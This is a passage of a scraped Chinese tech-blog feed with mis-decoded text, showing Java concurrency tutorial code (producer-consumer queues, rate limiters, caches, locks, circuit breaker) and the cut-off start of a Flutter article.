<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton5</span> {
    INSTANCE;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ–¹æ³•</span>
    }
}
</code></pre>
<h4 data-id="heading-178">8.2 ç”Ÿäº§è€…æ¶ˆè´¹è€…</h4>
<h5 data-id="heading-179">8.2.1 ä½¿ç”¨BlockingQueueï¼ˆæ¨èï¼‰</h5>
<pre><code class="hljs language-java" lang="java">BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>);

<span class="hljs-comment">// ç”Ÿäº§è€…</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    queue.put(<span class="hljs-string">"item"</span>);  <span class="hljs-comment">// é˜»å¡æ’å…¥</span>
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> queue.take();  <span class="hljs-comment">// é˜»å¡å–å‡º</span>
}).start();
</code></pre>
<h5 data-id="heading-180">8.2.2 ä½¿ç”¨wait/notify</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Queue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// ç”Ÿäº§è€…</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (queue.size() == MAX_SIZE) {
        lock.wait();  <span class="hljs-comment">// é˜Ÿåˆ—æ»¡ï¼Œç­‰å¾…</span>
    }
    queue.offer(<span class="hljs-string">"item"</span>);
    lock.notifyAll();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
}

<span class="hljs-comment">// æ¶ˆè´¹è€…</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (queue.isEmpty()) {
        lock.wait();  <span class="hljs-comment">// é˜Ÿåˆ—ç©ºï¼Œç­‰å¾…</span>
    }
    <span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> queue.poll();
    lock.notifyAll();  <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…</span>
}
</code></pre>
<h5 data-id="heading-181">8.2.3 ä½¿ç”¨Lock/Condition</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç”Ÿäº§è€…</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (queue.size() == MAX_SIZE) {
        notFull.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸æ»¡</span>
    }
    queue.offer(<span class="hljs-string">"item"</span>);
    notEmpty.signal();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-182">8.3 å¤šçº¿ç¨‹ä¸‹è½½</h4>
<h5 data-id="heading-183">8.3.1 æ–‡ä»¶åˆ†æ®µä¸‹è½½</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. è·å–æ–‡ä»¶å¤§å°</span>
<span class="hljs-type">long</span> <span class="hljs-variable">fileSize</span> <span class="hljs-operator">=</span> getFileSize(url);
<span class="hljs-type">long</span> <span class="hljs-variable">segmentSize</span> <span class="hljs-operator">=</span> fileSize / threadCount;

<span class="hljs-comment">// 2. åˆ›å»ºæ–‡ä»¶</span>
<span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(filePath, <span class="hljs-string">"rw"</span>);
file.setLength(fileSize);

<span class="hljs-comment">// 3. å¯åŠ¨ä¸‹è½½çº¿ç¨‹</span>
<span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(threadCount);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; threadCount; i++) {
    <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> i * segmentSize;
    <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> (i == threadCount - <span class="hljs-number">1</span>) ? fileSize - <span class="hljs-number">1</span> : (i + <span class="hljs-number">1</span>) * segmentSize - <span class="hljs-number">1</span>;
    executor.submit(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DownloadTask</span>(url, filePath, start, end, latch));
}
latch.await();
</code></pre>
<h5 data-id="heading-184">8.3.2 ä¸‹è½½ä»»åŠ¡</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è®¾ç½®Rangeè¯·æ±‚å¤´ï¼Œåªä¸‹è½½æŒ‡å®šèŒƒå›´</span>
conn.setRequestProperty(<span class="hljs-string">"Range"</span>, <span class="hljs-string">"bytes="</span> + start + <span class="hljs-string">"-"</span> + end);

<span class="hljs-comment">// å®šä½åˆ°æ–‡ä»¶ä½ç½®å¹¶å†™å…¥</span>
file.seek(start);
file.write(buffer, <span class="hljs-number">0</span>, len);
</code></pre>
<h4 data-id="heading-185">8.4 é™æµå™¨å®ç°</h4>
<h5 data-id="heading-186">8.4.1 ä»¤ç‰Œæ¡¶ç®—æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBucket</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> capacity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> refillRate;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> tokens;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> lastRefillTime;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">()</span> {
        refill();  <span class="hljs-comment">// è¡¥å……ä»¤ç‰Œ</span>
        <span class="hljs-keyword">if</span> (tokens &gt;= <span class="hljs-number">1</span>) {
            tokens -= <span class="hljs-number">1</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refill</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">double</span> <span class="hljs-variable">elapsed</span> <span class="hljs-operator">=</span> (now - lastRefillTime) / <span class="hljs-number">1000.0</span>;
        tokens = Math.min(capacity, tokens + elapsed * refillRate);
        lastRefillTime = now;
    }
}
</code></pre>
<h5 data-id="heading-187">8.4.2 æ¼æ¡¶ç®—æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeakyBucket</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> capacity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> leakInterval;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> water;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> lastLeakTime;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAdd</span><span class="hljs-params">()</span> {
        leak();  <span class="hljs-comment">// æ¼å‡º</span>
        <span class="hljs-keyword">if</span> (water &lt; capacity) {
            water++;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">leak</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">int</span> <span class="hljs-variable">leaks</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) ((now - lastLeakTime) / leakInterval);
        water = Math.max(<span class="hljs-number">0</span>, water - leaks);
        lastLeakTime = now;
    }
}
</code></pre>
<h5 data-id="heading-188">8.4.3 æ»‘åŠ¨çª—å£ç®—æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindow</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> windowSize;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> limit;
    <span class="hljs-keyword">private</span> Queue&lt;Long&gt; requests = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">windowStart</span> <span class="hljs-operator">=</span> now - windowSize * <span class="hljs-number">1000</span>;
        
        <span class="hljs-comment">// ç§»é™¤è¿‡æœŸè¯·æ±‚</span>
        <span class="hljs-keyword">while</span> (!requests.isEmpty() &amp;&amp; requests.peek() &lt; windowStart) {
            requests.poll();
        }
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¶…é™</span>
        <span class="hljs-keyword">if</span> (requests.size() &lt; limit) {
            requests.offer(now);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h4 data-id="heading-189">8.5 ç¼“å­˜å®ç°</h4>
<h5 data-id="heading-190">8.5.1 çº¿ç¨‹å®‰å…¨çš„ç¼“å­˜</h5>
<pre><code class="hljs language-java" lang="java">ConcurrentHashMap&lt;String, String&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
cache.put(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(<span class="hljs-string">"key"</span>);
</code></pre>
<h5 data-id="heading-191">8.5.2 LRUç¼“å­˜</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LRUCache</span>&lt;K, V&gt; {
    <span class="hljs-keyword">private</span> LinkedHashMap&lt;K, V&gt; cache;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LRUCache</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> {
        <span class="hljs-built_in">this</span>.cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;K, V&gt;(capacity, <span class="hljs-number">0.75f</span>, <span class="hljs-literal">true</span>) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeEldestEntry</span><span class="hljs-params">(Map.Entry&lt;K, V&gt; eldest)</span> {
                <span class="hljs-keyword">return</span> size() &gt; capacity;
            }
        };
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(K key)</span> {
        <span class="hljs-keyword">return</span> cache.get(key);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> {
        cache.put(key, value);
    }
}
</code></pre>
<h5 data-id="heading-192">8.5.3 å¸¦è¿‡æœŸæ—¶é—´çš„ç¼“å­˜</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> ConcurrentHashMap&lt;K, V&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
<span class="hljs-keyword">private</span> ConcurrentHashMap&lt;K, Long&gt; timestamps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
<span class="hljs-keyword">private</span> <span class="hljs-type">long</span> ttl;

<span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(K key)</span> {
    <span class="hljs-type">Long</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> timestamps.get(key);
    <span class="hljs-keyword">if</span> (timestamp != <span class="hljs-literal">null</span> &amp;&amp; System.currentTimeMillis() - timestamp &gt; ttl) {
        cache.remove(key);
        timestamps.remove(key);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> cache.get(key);
}
</code></pre>
<h2 data-id="heading-193">9. é«˜å¹¶å‘ç³»ç»Ÿè®¾è®¡</h2>
<h4 data-id="heading-194">9.1 é«˜å¹¶å‘ç³»ç»Ÿæ¶æ„</h4>
<h5 data-id="heading-195">9.1.1 ç³»ç»Ÿåˆ†å±‚</h5>
<p>é«˜å¹¶å‘ç³»ç»Ÿé€šå¸¸é‡‡ç”¨åˆ†å±‚æ¶æ„ã€‚</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   è´Ÿè½½å‡è¡¡å±‚     â”‚  Nginxã€F5ç­‰
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   åº”ç”¨æœåŠ¡å±‚     â”‚  å¤šä¸ªåº”ç”¨æœåŠ¡å™¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç¼“å­˜å±‚         â”‚  Redisã€Memcached
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   æ•°æ®åº“å±‚       â”‚  ä¸»ä»å¤åˆ¶ã€åˆ†åº“åˆ†è¡¨
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>åˆ†å±‚è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>è´Ÿè½½å‡è¡¡å±‚</strong>ï¼šåˆ†å‘è¯·æ±‚åˆ°å¤šä¸ªåº”ç”¨æœåŠ¡å™¨</li>
<li><strong>åº”ç”¨æœåŠ¡å±‚</strong>ï¼šå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œå¯ä»¥æ°´å¹³æ‰©å±•</li>
<li><strong>ç¼“å­˜å±‚</strong>ï¼šå‡å°‘æ•°æ®åº“å‹åŠ›ï¼Œæé«˜å“åº”é€Ÿåº¦</li>
<li><strong>æ•°æ®åº“å±‚</strong>ï¼šå­˜å‚¨æ•°æ®ï¼Œä½¿ç”¨ä¸»ä»å¤åˆ¶å’Œåˆ†åº“åˆ†è¡¨</li>
</ul>
<h5 data-id="heading-196">9.1.2 è´Ÿè½½å‡è¡¡</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoadBalancer</span> {
    <span class="hljs-keyword">private</span> List&lt;String&gt; servers;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">getServer</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> servers.get(index);
        index = (index + <span class="hljs-number">1</span>) % servers.size();
        <span class="hljs-keyword">return</span> server;
    }
}
</code></pre>
<h5 data-id="heading-197">9.1.3 ç¼“å­˜è®¾è®¡</h5>
<p><strong>Cache Asideæ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¯»ï¼šå…ˆæŸ¥ç¼“å­˜ï¼Œæ²¡æœ‰å†æŸ¥æ•°æ®åº“</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(key);
    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
        value = database.get(key);
        cache.put(key, value);
    }
    <span class="hljs-keyword">return</span> value;
}

<span class="hljs-comment">// å†™ï¼šæ›´æ–°æ•°æ®åº“ï¼Œåˆ é™¤ç¼“å­˜</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String key, Object value)</span> {
    database.update(key, value);
    cache.remove(key);
}
</code></pre>
<h5 data-id="heading-198">9.1.4 æ•°æ®åº“ä¼˜åŒ–</h5>
<ul>
<li><strong>ä¸»ä»å¤åˆ¶</strong>ï¼šä¸»åº“å†™ï¼Œä»åº“è¯»</li>
<li><strong>åˆ†åº“åˆ†è¡¨</strong>ï¼šå‚ç›´åˆ†åº“ï¼ˆæŒ‰ä¸šåŠ¡ï¼‰ï¼Œæ°´å¹³åˆ†è¡¨ï¼ˆæŒ‰æ•°æ®é‡ï¼‰</li>
</ul>
<h4 data-id="heading-199">9.2 å¹¶å‘æ§åˆ¶ç­–ç•¥</h4>
<h5 data-id="heading-200">9.2.1 ä¹è§‚é”</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ›´æ–°æ—¶æ£€æŸ¥ç‰ˆæœ¬å·</span>
<span class="hljs-comment">// SQL: UPDATE product SET stock = stock - ?, version = version + 1 </span>
<span class="hljs-comment">//      WHERE id = ? AND version = ?</span>
<span class="hljs-type">int</span> <span class="hljs-variable">rows</span> <span class="hljs-operator">=</span> productDao.updateStock(productId, quantity, oldVersion);
<span class="hljs-keyword">return</span> rows &gt; <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç‰ˆæœ¬å·åŒ¹é…æ‰æ›´æ–°æˆåŠŸ</span>
</code></pre>
<h5 data-id="heading-201">9.2.2 æ‚²è§‚é”</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æŸ¥è¯¢æ—¶åŠ é”</span>
<span class="hljs-comment">// SQL: SELECT * FROM product WHERE id = ? FOR UPDATE</span>
<span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productDao.selectForUpdate(productId);
<span class="hljs-comment">// å…¶ä»–çº¿ç¨‹æ— æ³•ä¿®æ”¹ï¼Œç›´åˆ°å½“å‰äº‹åŠ¡æäº¤</span>
</code></pre>
<h5 data-id="heading-202">9.2.3 åˆ†å¸ƒå¼é”</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Redis: SET key value NX EX 30</span>
<span class="hljs-comment">// å¦‚æœkeyä¸å­˜åœ¨åˆ™è®¾ç½®ï¼Œè¿‡æœŸæ—¶é—´30ç§’</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(String key)</span> {
    <span class="hljs-keyword">return</span> redis.setIfAbsent(<span class="hljs-string">"lock:"</span> + key, value, <span class="hljs-number">30</span>, TimeUnit.SECONDS);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">(String key)</span> {
    redis.delete(<span class="hljs-string">"lock:"</span> + key);
}
</code></pre>
<h4 data-id="heading-203">9.3 é™æµä¸é™çº§</h4>
<h5 data-id="heading-204">9.3.1 é™æµç®—æ³•</h5>
<p>é™æµç®—æ³•åŒ…æ‹¬ä»¤ç‰Œæ¡¶ã€æ¼æ¡¶ã€æ»‘åŠ¨çª—å£ç­‰ï¼ˆè¯¦è§8.4èŠ‚ï¼‰ã€‚</p>
<h5 data-id="heading-205">9.3.2 é™çº§ç­–ç•¥</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">errorCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">degraded</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (degraded) {
        returnDefaultResponse();  <span class="hljs-comment">// é™çº§ï¼šè¿”å›é»˜è®¤å€¼</span>
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-keyword">try</span> {
        doProcess();
        errorCount = <span class="hljs-number">0</span>;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">if</span> (++errorCount &gt; <span class="hljs-number">10</span>) {
            degraded = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è§¦å‘é™çº§</span>
        }
    }
}
</code></pre>
<h5 data-id="heading-206">9.3.3 ç†”æ–­æœºåˆ¶</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">State</span> { CLOSED, OPEN, HALF_OPEN }
<span class="hljs-keyword">private</span> <span class="hljs-type">State</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> State.CLOSED;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">failureCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">execute</span><span class="hljs-params">(Supplier&lt;T&gt; supplier)</span> {
    <span class="hljs-keyword">if</span> (state == State.OPEN) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ç†”æ–­å™¨æ‰“å¼€"</span>);
    }
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> supplier.get();
        <span class="hljs-keyword">if</span> (state == State.HALF_OPEN) {
            state = State.CLOSED;  <span class="hljs-comment">// æ¢å¤</span>
        }
        failureCount = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">return</span> result;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">if</span> (++failureCount &gt;= <span class="hljs-number">5</span>) {
            state = State.OPEN;  <span class="hljs-comment">// ç†”æ–­</span>
        }
        <span class="hljs-keyword">throw</span> e;
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter é‚ªä¿®ç§˜ç±ï¼šé‚£äº›å®˜æ–¹æ–‡æ¡£ä¸ä¼šå‘Šè¯‰ä½ çš„éªšæ“ä½œ]]></title>    <link>https://juejin.cn/post/7592683699771473930</link>    <guid>https://juejin.cn/post/7592683699771473930</guid>    <pubDate>2026-01-08T05:50:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592683699771473930" data-draft-id="7592610104441438218" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter é‚ªä¿®ç§˜ç±ï¼šé‚£äº›å®˜æ–¹æ–‡æ¡£ä¸ä¼šå‘Šè¯‰ä½ çš„éªšæ“ä½œ"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter"/> <meta itemprop="datePublished" content="2026-01-08T05:50:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜Agions"/> <meta itemprop="url" content="https://juejin.cn/user/360295545187751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter é‚ªä¿®ç§˜ç±ï¼šé‚£äº›å®˜æ–¹æ–‡æ¡£ä¸ä¼šå‘Šè¯‰ä½ çš„éªšæ“ä½œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295545187751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜Agions
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:50:22.000Z" title="Thu Jan 08 2026 05:50:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol 